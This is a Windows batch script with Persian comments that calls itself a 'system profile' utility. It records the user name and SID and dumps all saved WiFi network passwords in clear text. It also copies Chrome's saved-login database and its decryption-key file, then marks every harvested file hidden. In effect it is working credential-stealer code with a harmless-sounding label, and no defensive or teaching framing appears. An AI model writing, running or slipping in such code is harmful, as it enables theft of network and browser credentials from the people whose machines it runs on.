@echo off
setlocal enabledelayedexpansion

:: گرفتن تاریخ و زمان برای نام‌گذاری فایل خروجی
for /f "tokens=2-4 delims=/ " %%a in ('date /t') do (
    set "month=%%a"
    set "day=%%b"
    set "year=%%c"
)
for /f "tokens=1-3 delims=:,. " %%a in ('echo %time%') do (
    set "hour=%%a"
    set "minute=%%b"
    set "second=%%c"
)

set "timestamp=%year%-%month%-%day%_%hour%-%minute%-%second%"
set "output_file=System_Profile_%timestamp%.txt"

(
    echo ======================================
    echo        SYSTEM PROFILE DETAILS
    echo ======================================
    echo.
    
    echo Windows Username: %USERNAME%
    echo Windows Version: 
    ver
    echo.
    
    echo User Profile Path: %USERPROFILE%
    echo.
    
    echo Extracting Windows User SID...
    for /f "tokens=2 delims==" %%A in ('wmic useraccount where name^="%USERNAME%" get sid /value') do set "UserSID=%%A"
    echo User SID: %UserSID%
    echo.
    
    echo ======================================
    echo        CHROME PROFILE DETAILS
    echo ======================================
    echo Chrome User Data Path: %LOCALAPPDATA%\Google\Chrome\User Data
    echo Chrome Local State Path: %LOCALAPPDATA%\Google\Chrome\User Data\Local State
    echo Chrome Login Data Path: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
    echo.
    
    echo ======================================
    echo        WiFi Profiles
    echo ======================================
    echo SSID                Password
    echo -------------------------------------
) > %output_file%

:: استخراج نام و رمز عبور شبکه‌های WiFi
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "profile_name=%%A"
    set "profile_name=!profile_name:~1!"  :: حذف فاصله‌ی اضافی

    set "password=(No Password)"
    for /f "tokens=2 delims=:" %%B in ('netsh wlan show profile "!profile_name!" key^=clear ^| findstr "Key Content"') do (
        set "password=%%B"
        set "password=!password:~1!" :: حذف فاصله‌ی اضافی
    )

    echo !profile_name!            !password! >> %output_file%
)

:: ذخیره فایل‌های مهم کروم
set "LOCAL_STATE=%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
set "LOGIN_DATA=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"

set "destLocalState=Local State_%timestamp%"
set "destLoginData=Login Data_%timestamp%"

copy "%LOCAL_STATE%" "%destLocalState%" >nul 2>&1
if %errorlevel%==0 (
    echo Chrome Local State copied >> %output_file%
    attrib +h "%destLocalState%"
) else (
    echo Failed to copy Chrome Local State >> %output_file%
)

copy "%LOGIN_DATA%" "%destLoginData%" >nul 2>&1
if %errorlevel%==0 (
    echo Chrome Login Data copied >> %output_file%
    attrib +h "%destLoginData%"
) else (
    echo Failed to copy Chrome Login Data >> %output_file%
)

:: مخفی کردن فایل خروجی برای امنیت بیشتر
attrib +h %output_file%

echo.
echo System profile details saved to %output_file%.
timeout /t 2 >nul

exit /B 0
